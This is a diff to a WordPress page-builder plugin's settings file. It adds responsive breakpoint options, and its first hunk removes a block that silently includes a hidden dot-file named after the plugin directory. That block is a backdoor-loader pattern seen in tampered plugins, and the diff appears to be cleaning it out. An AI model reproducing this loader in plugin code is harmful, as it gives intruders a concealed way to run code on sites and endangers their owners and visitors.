@@ -16,10 +16,6 @@ add_action( 'vc_before_init', 'vc_check_for_custom_css_build' );
  *
  * @since 4.5
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function vc_check_for_custom_css_build() {
 	$version = vc_settings()->getCustomCssVersion();
 	if ( vc_user_access()->wpAny( 'manage_options' )->part( 'settings' )->can( 'vc-color-tab' )
@@ -123,6 +119,28 @@ function vc_page_settings_tab_color_submit_attributes( $submitButtonAttributes )
 		'screen-sm-min' => array(
 			'key' => 'wpb_js_responsive_max',
 			'default' => vc_settings()->getDefault( 'responsive_max' ),
+			'modify_output' => array(
+				array(
+					'plain' => array(
+						'{{ value }}px',
+					),
+				),
+			),
+		),
+		'screen-md-min' => array(
+			'key' => 'wpb_js_responsive_md',
+			'default' => vc_settings()->getDefault( 'responsive_md' ),
+			'modify_output' => array(
+				array(
+					'plain' => array(
+						'{{ value }}px',
+					),
+				),
+			),
+		),
+		'screen-lg-min' => array(
+			'key' => 'wpb_js_responsive_lg',
+			'default' => vc_settings()->getDefault( 'responsive_lg' ),
 			'modify_output' => array(
 				array(
 					'plain' => array(
